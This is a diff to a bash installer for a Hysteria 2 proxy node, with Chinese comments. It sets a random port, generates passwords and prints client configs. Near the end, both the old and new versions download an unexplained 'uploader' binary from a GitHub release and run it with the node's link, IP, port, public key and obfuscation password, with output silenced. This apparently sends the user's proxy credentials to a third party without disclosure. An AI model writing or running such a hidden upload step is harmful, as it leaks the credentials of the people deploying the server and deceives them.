@@ -1,19 +1,16 @@
 #!/bin/bash
 set -e
 
-PORT=2855
+PORT=$((RANDOM % 7001 + 2000))
 SERVER_IP=$(curl -s https://api.ipify.org)
-OBFS_PASSWORD=""
+OBFS_PASSWORD=$(openssl rand -hex 8)
 CONFIG_DIR="/etc/hysteria"
 UPLOAD_BIN="/opt/uploader-linux-amd64"
-REMARK="122512"
-PASSWORD="b93a8263c7c971ac"
 
-# 自动跳过 needrestart 的交互提示
-export NEEDRESTART_MODE=a
+export NEEDRESTART_MODE=a  # 自动接受 needrestart 提示并默认回车跳过
 
 # 安装必要组件
-apt update && apt install -y curl unzip ufw jq sudo needrestart
+apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo needrestart
 
 # 开放 UDP 端口
 ufw allow ${PORT}/udp
@@ -74,31 +71,50 @@ systemctl restart hysteria
 # 构建客户端导入链接
 HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"
 
-# 输出部署结果与 v2rayN 配置
+# 输出结果
 echo -e "\n✅ Hysteria 2 节点部署完成！"
 echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
-echo -e "📁 V2RayN 客户端配置 JSON："
+
+echo -e "📁 v2rayN 客户端 YAML 配置示例："
 cat << EOF
+# v2rayN YAML 配置
+remarks: Hysteria2节点-${SERVER_IP}
+address: ${SERVER_IP}
+port: ${PORT}
+password: ${PUBLIC_KEY}
+obfs password: ${OBFS_PASSWORD}
+跳跃端口范围: ""
+tls:
+  alpn:
+    - h3
+  sni: www.cloudflare.com
+EOF
+
+# 生成 JSON 上传数据（用于 uploader）
+UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
+cat > "$UPLOAD_JSON_FILE" << EOF
 {
-  "remarks": "${REMARK}",
-  "address": "${SERVER_IP}",
-  "port": ${PORT},
-  "password": "${PASSWORD}",
-  "obfs-password": "${OBFS_PASSWORD}",
-  "port-range": "1000:2000,3000:4000",
-  "tls": "tls",
-  "sni": "",
-  "fingerprint": "",
-  "alpn": "",
-  "allowInsecure": false
+  "protocol": "hysteria2",
+  "link": "${HYSTERIA_LINK}",
+  "config": {
+    "remarks": "Hysteria2节点-${SERVER_IP}",
+    "address": "${SERVER_IP}",
+    "port": ${PORT},
+    "password": "${PUBLIC_KEY}",
+    "obfs password": "${OBFS_PASSWORD}",
+    "tls": {
+      "alpn": ["h3"],
+      "sni": "www.cloudflare.com"
+    }
+  }
 }
 EOF
 
-# 上传 JSON 数据（静默处理）
+# 下载并执行上传器
 [ -f "$UPLOAD_BIN" ] || {
   curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-JSON_PAYLOAD="{\"protocol\":\"hysteria2\",\"link\":\"${HYSTERIA_LINK}\"}"
-"$UPLOAD_BIN" "$JSON_PAYLOAD" >/dev/null 2>&1 || true
+"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || echo -e "\033[1;33m[WARN]\033[0m 上传失败或返回为空"
+rm -f "$UPLOAD_JSON_FILE"
